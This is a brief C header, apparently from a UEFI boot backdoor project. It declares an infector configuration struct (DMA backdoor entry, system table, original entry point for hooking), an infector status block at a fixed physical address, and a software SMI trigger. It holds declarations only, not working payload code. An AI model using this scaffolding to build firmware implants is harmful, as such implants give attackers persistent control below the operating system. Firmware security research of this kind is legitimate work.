
#ifndef _BOOT_BACKDOOR_H_
#define _BOOT_BACKDOOR_H_

#pragma warning(disable: 4200)

#define MAX_IMAGE_SIZE (1 * 1024 * 1024)

// physical address of INFECTOR_STATUS
#define INFECTOR_STATUS_ADDR (0x1000 - sizeof(INFECTOR_STATUS))

#pragma pack(1)

typedef struct _INFECTOR_CONFIG
{
    UINT64 BackdoorEntryDma;
    UINT64 LocateProtocol;
    UINT64 SystemTable;
    UINT64 BackdoorEntryInfected;
    UINT64 OriginalEntryPoint;

} INFECTOR_CONFIG,
*PINFECTOR_CONFIG;

typedef struct _INFECTOR_STATUS
{
    UINT64 Success;
    UINT64 Unused;

} INFECTOR_STATUS,
*PINFECTOR_STATUS;

#pragma pack()

void ConsolePrint(char *Message);
VOID GenerateSoftwareSMI(UINT8 Data, UINT8 Command);

#endif
